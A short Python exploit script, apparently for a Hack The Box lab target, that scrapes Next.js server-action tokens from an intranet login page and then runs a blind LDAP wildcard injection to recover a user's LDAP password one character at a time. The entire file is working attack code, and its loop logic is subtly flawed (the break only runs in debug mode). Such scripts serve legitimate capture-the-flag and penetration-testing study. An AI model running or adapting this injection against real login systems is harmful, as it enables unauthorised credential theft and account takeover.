import requests
import string
import re
import json
def get_secret(debug=False):
    url = "http://intranet.ghost.htb:8008/login"
    secret = ""
    alphabet = string.ascii_letters + string.digits
    page = requests.get(url).text
    action_1_0 = re.search(r'<input type="hidden" name="\$ACTION_1:0" value="([^"]+)"',page).group(1).replace("&quot;",'"' )
    action_key = re.search(r'<input type="hidden" name="\$ACTION_KEY" value="([^"]+)"',page).group(1).replace("&quot;",'"')
    next_action = json.loads(action_1_0)["id"]
    for i in range(16):
        for letter in alphabet:
            r = requests.post(url, data={"1_$ACTION_REF_1":"","1_$ACTION_1:0":action_1_0, "1_$ACTION_1:1":"[{}]", "1_$ACTION_KEY":action_key,"1_ldap-username":"gitea_temp_principal", "1_ldap-secret": secret + letter + "*","0":'[{},"$K1"]'}, headers={"Next-Action":next_action})
            if "Invalid combination" in r.text:
                continue
            secret += letter
            if debug:
                print(letter, end='', flush=True)
                break
            if debug:
                print
    return secret
if __name__ == "__main__":
    get_secret(debug=True)
